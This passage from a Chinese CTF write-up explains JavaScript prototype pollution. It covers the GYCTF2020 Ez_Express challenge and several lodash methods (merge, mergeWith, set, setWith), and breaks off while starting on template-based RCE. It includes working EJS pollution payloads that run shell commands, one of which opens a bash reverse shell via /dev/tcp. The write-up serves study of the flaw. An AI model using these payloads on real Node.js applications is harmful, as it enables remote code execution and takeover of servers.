<p>那么通过上面分析我们可与得到merge存在原型链污染漏洞</p>
<p>至于为什么我们修改代码可与污染成功</p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<h6 id="例题：-GYCTF2020-Ez-Express"><a href="#例题：-GYCTF2020-Ez-Express" class="headerlink" title="例题：[GYCTF2020]Ez_Express"></a>例题：[GYCTF2020]Ez_Express</h6><p>访问<a href="http://www.zip下载源码：">www.zip下载源码：</a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>login.js中存在merg函数</p>
<p>看一下登录页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708110353592.png"
                      alt="image-20230708110353592"
                ></p>
<p>点击登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708110408662.png"
                      alt="image-20230708110408662"
                ></p>
<p>点击注册</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708110422468.png"
                      alt="image-20230708110422468"
                ></p>
<p>回到源码</p>
<p>继续分析</p>
<p>看一下login和register的代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>先看注册safeKeyword进行检查</p>
<p>看一下safeKeyword函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果匹配到admin，会输出弹窗</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br></pre></td></tr></table></figure></div>

<p>没有匹配到则会正常注册登录</p>
<p>看一下login</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">   if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">     req.session.user.isLogin=true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>就是要求账号时注册过的</p>
<p>但是题目上面让我们注册admin账号</p>
<p>继续回到register</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">req.session.user=&#123;</span><br><span class="line">  &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">  &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">  &#x27;isLogin&#x27;:false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当我们注册成功后，会将信息写入session</p>
<p>然后用户名会经过toUpperCase()函数处理</p>
<p><code>toUpperCase()</code> 是 JavaScript 字符串对象的一个内置方法，用于将字符串中的所有字符转换为大写形式。它不会改变原始字符串，而是返回一个新的字符串</p>
<p>但是<code>toUpperCase</code>函数会把某些特殊的字符解析为相应的字母，例如<code>&quot;ı&quot;.toUpperCase() == &#39;I&#39;，&quot;ſ&quot;.toUpperCase() == &#39;S&#39;</code>，</p>
<p>那么我们就可以通过这个小的函数漏洞去进行绕过注册的限制，我们直接注册admın，那么经过函数处理就会变成admin</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708113158574.png"
                      alt="image-20230708113158574"
                ></p>
<p>成功登录告诉了我们flag的位置</p>
<p>有一个提交框，提交后会跳到action路由</p>
<p>代码分析一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>代码很好分析</p>
<p>就是先判断是不是admin用户，如果不是就会弹出admin is asked</p>
<p>如果是则会执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">req.session.user.data = clone(req.body);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>clone会调用merge函数</p>
<p>那么这里我们就可以进行原型链污染</p>
<p>但是现在的问题是我们要污染什么，污染后能干什么</p>
<p>继续分析代码上面的info路由</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>res.render是 Express.js 框架中用于渲染视图模板的方法。它用于将动态生成的数据和视图模板结合起来，生成最终的 HTML 响应并发送给客户端。我们可以看到这里是将res的outputFunctionName渲染到index，而且这里的outputFunctionName是未定义的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708115931820.png"
                      alt="image-20230708115931820"
                ></p>
<p>那这里思路就很明显了，我们可以原型链污染给outputFunctionName赋上我们想要执行的命令</p>
<p>然后通过render进行渲染，然后进行ssti，执行命令获取flag</p>
<p>抓包看一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708121733690.png"
                      alt="image-20230708121733690"
                ></p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>或者直接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>先访问action路由进行原型链污染</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708121944730.png"
                      alt="image-20230708121944730"
                ></p>
<p>然后访问info进行ssti，命令执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708122013208.png"
                      alt="image-20230708122013208"
                ></p>
<p>然后看其他师傅的文章说还有一种非预期解ejsrce，这里直接贴paylaod了，后门有机会在学习</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230708122645960.png"
                      alt="image-20230708122645960"
                ></p>
<p>这里使用了ejs这个模板引擎</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;3000端口&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//设置ejs:</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;); //设置模板引擎为ejs</span><br><span class="line">app.set(&#x27;views&#x27;, [`$&#123;path.join(__dirname,&#x27;moban&#x27;)&#125;`, `$&#123;path.join(__dirname,&#x27;views&#x27;)&#125;`]); //设置模板文件的存放位置</span><br><span class="line">app.engine(&#x27;html&#x27;, require(&#x27;ejs&#x27;).__express); //将html文件作为ejs模板文件来解析</span><br></pre></td></tr></table></figure></div>

<p>这个模板引擎本身是存在原形污染的，可以直接进行rce，且有大把现成的exp….</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>先访问&#x2F;action进行原型链污染，再访问&#x2F;info进行模板渲染，实现RCE</p>
<p>接着post访问api.js就可以反弹shell了</p>
<h5 id="Lodash-模块原型链污染"><a href="#Lodash-模块原型链污染" class="headerlink" title="Lodash 模块原型链污染"></a>Lodash 模块原型链污染</h5><p>这里是跟着<a class="link"   href="https://xz.aliyun.com/t/12053#toc-5%E5%A4%8D%E7%8E%B0%E7%9A%84%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E6%96%B9%E6%B6%89%E5%8F%8A%E4%BA%86%E5%87%A0%E4%B8%AAcve" >https://xz.aliyun.com/t/12053#toc-5复现的，这个地方涉及了几个cve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里就简单分析一下lodash的几个简单的方法，后续有机会了在学习。</p>
<h6 id="lodash-merge-方法造成的原型链污染"><a href="#lodash-merge-方法造成的原型链污染" class="headerlink" title="lodash.merge 方法造成的原型链污染"></a>lodash.merge 方法造成的原型链污染</h6><p>lodash.merge作为loadsh中的对象合并插件，可以递归合并sources来源对象自身和继承的可枚举属性到object目标对象，以创建父映射对象</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(object, sources)</span><br></pre></td></tr></table></figure></div>

<p>这个和我们上面分析的merge是一样的我们直接看源码分析了，</p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;merge.js</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230709162451992.png"
                      alt="image-20230709162451992"
                ></p>
<p>这是lodash库中merge方法的定义</p>
<p>这里直接调用了baseMerge方法，直接跟进</p>
<ul>
<li><p>node_modules&#x2F;lodash&#x2F;_baseMerge.js</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230709162549818.png"
                      alt="image-20230709162549818"
                ></p>
</li>
</ul>
<p>通过源码我们可以看到在baseFor里面对srcValue有一个筛选，这里会判断他是不是一个对象，所有如果我们要想进入到baseMerage方法，那就要求我们的Merge是一个object</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230709162809087.png"
                      alt="image-20230709162809087"
                ></p>
<p>到这我们进入了baseMergeDeep方法</p>
<p>这里将我们上一步传入的srcValue也就是我们merge的对象放进了assignMergeValue方法</p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230709163008187.png"
                      alt="image-20230709163008187"
                ></p>
<p>这里对对象的值和对象键名进行了一个筛查，最终进入了baseAssignValue</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230709163153187.png"
                      alt="image-20230709163153187"
                ></p>
<p>可以看到这里对我们的key做了判断，但是我们要进入到object[key]&#x3D;value才能进行原型链污染操作</p>
<p>所有这里我们要想办法绕过</p>
<p>POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prefixPayload = &#123; nickname: &quot;Will1am&quot; &#125;;</span><br><span class="line">payload：&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br><span class="line">_.merge(prefixPayload, payload);</span><br></pre></td></tr></table></figure></div>

<p>最终进入 <code>object[key] = value</code> 的赋值操作。</p>
<p>也就是object[prototype] &#x3D; {“role”: “admin”}</p>
<p>这样就给原型对象赋值了一个名为role，值为admin的属性</p>
<p>POC:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">console.log(&quot;Before polluted: &quot; + a.polluted);</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">console.log(&quot;After polluted: &quot; + a.polluted);</span><br></pre></td></tr></table></figure></div>

<h6 id="lodash-mergeWith-方法-CVE-2018-16487"><a href="#lodash-mergeWith-方法-CVE-2018-16487" class="headerlink" title="lodash.mergeWith 方法 CVE-2018-16487"></a>lodash.mergeWith 方法 CVE-2018-16487</h6><p>这个方法与merge方法不同的是mergeWith还会接受一个参数customizer，如果customizer返回undefined将由合并方法代替</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710092753220.png"
                      alt="image-20230710092753220"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">object：目标对象</span><br><span class="line">sources：来源对象</span><br><span class="line">srcindex：源对象（source）的索引位置</span><br><span class="line">customizer：这个函数定制合并值</span><br></pre></td></tr></table></figure></div>

<p>这里以一个小的例子来看：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var mergeWith = createAssigner(function(object, source, srcIndex, customizer) &#123;</span><br><span class="line">  baseMerge(object, source, srcIndex, customizer);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var obj1 = &#123; a: 1 &#125;;</span><br><span class="line">var obj2 = &#123; b: 2 &#125;;</span><br><span class="line">var obj3 = &#123; c: 3 &#125;;</span><br><span class="line"></span><br><span class="line">var mergedObject = mergeWith(&#123;&#125;, obj1, obj2, obj3);</span><br><span class="line"></span><br><span class="line">console.log(mergedObject); // 输出: &#123; a: 1, b: 2, c: 3 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里多出来的参数不好影响我们原型链的利用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">console.log(&quot;Before polluted: &quot; + a.polluted);</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">console.log(&quot;After polluted: &quot; + a.polluted);</span><br></pre></td></tr></table></figure></div>

<h6 id="lodash-set-方法造成的原型链污染"><a href="#lodash-set-方法造成的原型链污染" class="headerlink" title="lodash.set 方法造成的原型链污染"></a>lodash.set 方法造成的原型链污染</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(object, path, value)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>object</code>：要设置值的对象。</li>
<li><code>path</code>：表示属性路径的字符串，使用<code>.</code>作为层级分隔符。</li>
<li><code>value</code>：要设置的值。</li>
</ul>
<p>函数将根据路径遍历对象的属性，并将最终的值设置在路径的末端。如果路径中的某些属性不存在，则会创建缺少的属性。</p>
<p>例子：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function set(object, path, value) &#123;</span><br><span class="line">  if (!object || typeof object !== &#x27;object&#x27;) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const keys = path.split(&#x27;.&#x27;);</span><br><span class="line">  let currentObj = object;</span><br><span class="line"></span><br><span class="line">  for (let i = 0; i &lt; keys.length - 1; i++) &#123;</span><br><span class="line">    const key = keys[i];</span><br><span class="line"></span><br><span class="line">    if (!currentObj.hasOwnProperty(key) || typeof currentObj[key] !== &#x27;object&#x27;) &#123;</span><br><span class="line">      currentObj[key] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    currentObj = currentObj[key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  currentObj[keys[keys.length - 1]] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">set(obj, &#x27;foo.bar.baz&#x27;, 42);</span><br><span class="line"></span><br><span class="line">console.log(obj);  // 输出: &#123; foo: &#123; bar: &#123; baz: 42 &#125; &#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710094115600.png"
                      alt="image-20230710094115600"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var object = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line"> _.set(object, &#x27;a[0].b.c&#x27;, 4);</span><br><span class="line">console.log(object.a[0].b.c);</span><br><span class="line">// =&gt; 4 </span><br><span class="line">_.set(object, [&#x27;x&#x27;, &#x27;0&#x27;, &#x27;y&#x27;, &#x27;z&#x27;], 5);</span><br><span class="line">console.log(object.x[0].y.z);</span><br><span class="line">// =&gt; 5</span><br></pre></td></tr></table></figure></div>

<p>分析源码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710094300015.png"
                      alt="image-20230710094300015"
                ></p>
<p>这里对object进行了一个判断非空则调用baseSet方法</p>
<p>baseset接受三个参数就是我们上面传进来的修改对象，路径，值</p>
<p>跟进baseset方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710094443013.png"
                      alt="image-20230710094443013"
                ></p>
<p>这里先对object进行了判读。判断其是否为对象</p>
<p>然后进入castPath方法</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710094806832.png"
                      alt="image-20230710094806832"
                ></p>
<p>这里接受两个参数object和value</p>
<p>首先会对values判断是否为空</p>
<p>然后判断给定的值 <code>value</code> 是否是一个对象 <code>object</code> 的键（key），如果是，则返回一个包含该键的数组；如果不是，则会调用stringToPath方法，这里很明显我们调用的不是一个数组</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710095240099.png"
                      alt="image-20230710095240099"
                ></p>
<ul>
<li><code>memoizeCapped</code> 是一个函数，它用于创建一个带有缓存功能的函数。这里使用 <code>memoizeCapped</code> 来创建了一个具有缓存功能的 <code>stringToPath</code> 函数。</li>
<li><code>stringToPath</code> 函数接受一个字符串参数 <code>string</code>，表示属性路径。</li>
<li><code>result</code> 是一个数组，用于存储转换后的路径。</li>
<li>如果字符串的第一个字符的 ASCII 值等于 46（代表字符 “.”），则将空字符串 <code>&#39;&#39;</code> 添加到 <code>result</code> 数组中。这是为了处理属性路径以 “.” 开头的情况。</li>
<li><code>string.replace(rePropName, function(match, number, quote, subString) &#123; ... &#125;)</code> 使用正则表达式 <code>rePropName</code> 对字符串进行匹配和替换操作。</li>
<li>在每次匹配时，回调函数会被调用。<code>match</code> 表示匹配到的子字符串，<code>number</code> 表示匹配到的数字字符串，<code>quote</code> 表示匹配到的引号，<code>subString</code> 表示匹配到的子字符串（去除引号的部分）。</li>
<li>在回调函数中，根据情况将匹配到的值加入到 <code>result</code> 数组中。如果 <code>quote</code> 存在，说明匹配到的是带引号的子字符串，需要去除转义字符后加入 <code>result</code> 数组；否则，将 <code>number</code> 或者 <code>match</code> 加入 <code>result</code> 数组。</li>
<li>最后，返回 <code>result</code> 数组作为路径数组。</li>
</ul>
<p>整个 <code>stringToPath</code> 函数的作用是将字符串表示的属性路径转换为路径数组，每个元素表示路径的一部分。例如，对于属性路径字符串 <code>&#39;a.b[0].c&#39;</code>，转换后的路径数组为 <code>[&#39;a&#39;, &#39;b&#39;, &#39;0&#39;, &#39;c&#39;]</code>。</p>
<p>那么到这里这个方法就结束了，可以这里对传入的参数并没有进行过滤</p>
<p>那我就可以对他进行原型链污染</p>
<p>这里是贴的大佬的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line"></span><br><span class="line">var object_1 = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line">var object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(object_1.whoami);</span><br><span class="line">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">lodash.set(object_2, &#x27;__proto__.[&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">console.log(object_1.whoami);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710095731665.png"
                      alt="image-20230710095731665"
                ></p>
<p>可以看到这里已经污染成功了</p>
<h6 id="lodash-setWith-方法造成的原型链污染"><a href="#lodash-setWith-方法造成的原型链污染" class="headerlink" title="lodash.setWith 方法造成的原型链污染"></a>lodash.setWith 方法造成的原型链污染</h6><p>这里类似与上面的set方法，其实这里set和setwith与merge和mergewith的关系是相同的</p>
<p>这里也多了一个customizer参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710100104711.png"
                      alt="image-20230710100104711"
                ></p>
<p><code>setWith</code> 函数接受四个参数：</p>
<ul>
<li><code>object</code>：要设置值的对象。</li>
<li><code>path</code>：表示属性路径的字符串或路径数组。</li>
<li><code>value</code>：要设置的值。</li>
<li><code>customizer</code>：可选的自定义函数，用于进行设置操作</li>
</ul>
<p>这里和上面set的污染利用路径和方法差不多，参考上面set方法就行，这里就不在具体分析了</p>
<p>这里直接贴一个大佬的验证POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line"></span><br><span class="line">var object_1 = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line">var object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(object_1.whoami);</span><br><span class="line">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">lodash.setWith(object_2, &#x27;__proto__.[&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">console.log(object_1.whoami);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710100329716.png"
                      alt="image-20230710100329716"
                ></p>
<p>这里调试一下结果可能看的更清楚，这里为了方便，直接看最后的结果</p>
<p>这里可以看到是已经污染成功了</p>
<h6 id="配合-lodash-template-实现-RCE"><a href="#配合-lodash-template-实现-RCE" class="headerlink" title="配合 lodash.template 实现 RCE"></a>配合 lodash.template 实现 RCE</h6><p>Lodash.template 是 Lodash 中的一个简单的模板引擎，<strong>创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。</strong> HTML会在 “escape” 分隔符中转换为相应实体。 在 “evaluate” 分隔符中允许执行JavaScript代码。 在模板中<strong>可以自由访问变量</strong>。 如果设置了选项对象，则会优先覆盖 <code>_.templateSettings</code> 的值</p>
<p>在Lodash中，为了实现代码执行我们通常是污染template中的sourceURL属性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710102007690.png"
                      alt="image-20230710102007690"
                ></p>
<ul>
<li><p><code>sourceURL</code> 变量用于存储最终生成的 <code>sourceURL</code> 字符串。</p>
</li>
<li><p><code>&#39;//# sourceURL=&#39;</code> 是一个字符串，表示 <code>sourceURL</code> 的前缀部分。这是一个特殊的注释语法，用于指定源代码的 URL。</p>
</li>
<li><p><code>(&#39;sourceURL&#39; in options ? options.sourceURL : (&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;))</code> 是一个条件表达式，用于确定 <code>sourceURL</code> 的值。</p>
<ul>
<li><p>首先，它检查 <code>options</code> 对象中是否存在 <code>sourceURL</code> 属性。如果存在，则使用该值作为 <code>sourceURL</code>。</p>
</li>
<li><p>如果 <code>options</code> 对象中不存在 <code>sourceURL</code> 属性，它将使用 <code>&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;</code> 的形式来生成一个动态的 <code>sourceURL</code>。</p>
<ul>
